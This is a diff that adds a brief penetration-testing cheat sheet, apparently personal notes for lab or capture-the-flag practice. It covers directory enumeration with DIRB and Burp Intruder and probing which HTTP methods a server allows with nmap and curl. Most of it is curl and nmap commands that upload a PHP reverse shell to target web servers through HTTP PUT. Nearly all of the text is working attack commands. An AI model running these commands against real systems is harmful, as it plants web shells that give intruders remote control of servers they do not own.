@@ -1,0 +1,22 @@
+
+
+HTTP Directory Enumeration
+- Run DIRB to get a wordlist of directories and save. 
+- Send a query to Intruder.
+- Use url_path as a variable in Burp.  Assign directory wordlist. 
+- Use HTTP Verb as another variable in Burp.  Assign VERB wordlist
+
+Check for all methods supported:
+nmap --script http-methods --script-args.test-all 10.0.2.21
+
+curl -v -X OPTIONS http://10.0.2.21/test/
+
+Ways to PUT a file:
+curl -X PUT http://10.0.2.21 --upload-file file2.txt
+
+nmap -p80 10.0.2.21 --script http-put --script-args http-put.url='/test/php-reverse-shell.php', http-put.file='php-reverse-shell.php'
+
+
+Find PUT / WebDav and cadaver not working?:
+curl --upload-file  /root/Exploits/Web_Payloads/r.txt -v --url http://10.0.2.21/test/rshell.php -0 --http1.0
+curl --upload-file  /root/Exploits/Web_Payloads/r.txt -v --url http://10.10.10.15 -0 --http1.0
